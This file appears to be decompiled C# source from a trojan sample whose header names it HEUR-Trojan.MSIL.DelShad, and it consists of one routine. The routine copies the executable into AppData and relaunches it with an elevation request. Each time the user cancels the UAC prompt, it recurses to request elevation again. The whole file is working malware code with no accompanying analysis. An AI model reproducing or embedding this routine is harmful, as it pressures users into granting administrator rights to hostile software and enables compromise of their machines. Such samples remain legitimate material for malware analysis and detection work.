// Decompiled with JetBrains decompiler
// Type: TimeTime.Utils
// Assembly: TimeTime, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DE1A7A40-2404-4F4F-A36B-53821EC7A8B6
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-5ee8500fe1a2f22029908d4e2b32e7fb85aec03ffea714f3b5e82ebb2bc10f21.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace TimeTime
{
  internal class Utils
  {
    public static void uac_loop(string processName)
    {
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str2 = str1 + processName;
      ProcessStartInfo startInfo = new ProcessStartInfo(str2)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str1,
        Arguments = "/x"
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != processName) && !(location != str2))
        return;
      if (!File.Exists(str2))
      {
        File.Copy(friendlyName, str2);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Utils.uac_loop(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str2);
          Thread.Sleep(200);
          File.Copy(friendlyName, str2);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode == 1223)
            Utils.uac_loop(processName);
        }
      }
    }
  }
}
